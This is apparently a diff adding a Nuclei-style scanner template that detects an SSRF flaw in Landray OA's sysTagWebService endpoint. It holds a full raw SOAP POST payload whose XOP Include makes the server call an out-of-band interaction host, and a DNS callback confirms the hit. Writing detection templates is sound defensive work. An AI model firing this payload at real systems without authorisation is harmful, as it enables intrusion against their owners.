@@ -1,0 +1,35 @@
+id: landray-systagwebservice-ssrf
+info:
+  name: Landray OA sysTagWebService SSRF
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ssrf,dnslog
+http:
+  - raw:
+      - |
+        POST /sys/webservice/sysTagWebService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+        SOAPAction: ""
+
+        ------4upt9dwdca8rtwq9osuz
+        Content-Disposition: form-data; name="a"
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.tag.sys.kmss.landray.com/">
+        <soapenv:Header/>
+        <soapenv:Body>
+            <web:getGroups>
+                <arg0>
+                    <beginTimeStamp>a</beginTimeStamp>
+                    <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="http://{{interactsh-url}}"/></count>
+                </arg0>
+            </web:getGroups>
+        </soapenv:Body>
+        </soapenv:Envelope>
+        ------4upt9dwdca8rtwq9osuz--
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
